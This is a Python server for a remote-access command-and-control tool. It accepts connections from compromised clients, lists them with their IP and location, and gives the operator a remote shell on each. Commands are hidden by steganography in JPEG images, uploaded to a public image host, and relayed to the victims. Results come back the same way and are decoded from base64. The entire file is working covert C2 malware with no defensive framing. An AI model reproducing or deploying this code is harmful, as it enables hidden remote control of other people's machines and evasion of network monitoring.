#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading
import requests
import os
import base64
import json
import re
clientList = []             #连接的客户端列表
infolist = [] #连接的客户端列表(具体 带ip)
curClient = None            #当前的客户端
quitThread = False          #是否退出线程
lock = threading.Lock()
def getinfo(command):
    text='echo '+command+'>tmp.txt&copy base.jpg command.jpg&cd steghide&steghide.exe embed -cf '+ os.getcwd()+'\command.jpg -ef ../tmp.txt -p shadowwolf'
    os.system(text)
    request_url = 'http://mp.toutiao.com/upload_photo/?type=json'
    headers={
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,image/apng,*/*q=0.8,application/signed-exchangev=b3q=0.9",
    "Accept-Language": "zh-CN,zhq=0.9"
        }

    files = {'photo': ('command.jpg', open('command.jpg', 'rb'), 'image/jpeg')}
    r = requests.post(request_url, headers=headers, files=files)
    result= json.loads(r.text)
    return result['web_url']
def downandload(img_url):

    headers={
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,image/apng,*/*q=0.8,application/signed-exchangev=b3q=0.9",
    "Accept-Language": "zh-CN,zhq=0.9"
        }
    r = requests.get(img_url, headers=headers, stream=True)
    print(r.status_code) # 返回状态码
    if r.status_code == 200:
        open('result.jpg', 'wb').write(r.content) # 将内容写入图片
        print("down:done")
    os.system('del result.txt&cd steghide&del result.txt&steghide extract -sf ../result.jpg  -p shadowwolf&copy result.txt ..\&cd ..')
    result_cont = open('result.txt',"r",encoding="utf-8",errors="ignore")
    print(base64.b64decode(result_cont.read().encode("utf-8")).decode("utf-8"))
    
    result_cont.close()    
def shell_ctrl(socket,addr,ipinfo):
    while True:
        #com = input(str(addr[0]) + 'shell:')
        com = input(str(ipinfo[3:]) + ' \'s shell:')
        if com != '':
            shell_command=com
            socket.send((getinfo(shell_command)).encode('utf-8'))
            print(shell_command)
            data = socket.recv(1024)
            downandload(data.decode('utf-8'))
        if com == '@ch':
            select_client()
            return
        if com == '@q':
            quitThread = True
            print('-----------------------* Connection has ended *--------------------------')
            exit(0)
        print('请重新输入!\n')
def select_client():
    global clientList
    global curClient
    global curip
    print('--------------* The current is connected to the client: *----------------')
    for i in range(len(clientList)):
        #print('[%i]-> %s' % (i, str(clientList[i][1][0])))
        print('[%i]-> %s 地理位置:%s' % (i, str(infolist[i][0]),str(infolist[i][1])))
    print('Please select a client!')

    while True:
        num = input('client num:')
        if(len(num)):
            if(ord(num[0])>=48 and ord(num[0])<=57):
                if int(num) >= len(clientList):
                    print('Please input a correct num!')
                    continue
                else:
                    break

    curClient = clientList[int(num)]
    curip = infolist[int(num)]
def wait_connect(sk):
    global clientList
    while not quitThread:
        if len(clientList) == 0:
            print('Waiting for the connection......')
        sock, addr = sk.accept()
        
        
        info_=sock.recv(1024)
        
        info=(info_.decode('utf-8')).split('|')
        
        #print('New client %s is connection!' % (addr[0]))
        print('New client %s is connection!' % (info[0]))
        infolist.append((info[0],info[1]))
        
        lock.acquire()
        clientList.append((sock, addr))
        lock.release()

def main():
    print('@ch 重新选择客户端\n')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',7676))
    s.listen(1024)
    t = threading.Thread(target=wait_connect,args=(s,))
    t.start()

    while True:
        if len(clientList) > 0:
            select_client()  # 选择一个客户端
            shell_ctrl(curClient[0],curClient[1],curip[0]) #处理shell命令



if __name__ == '__main__':
    main()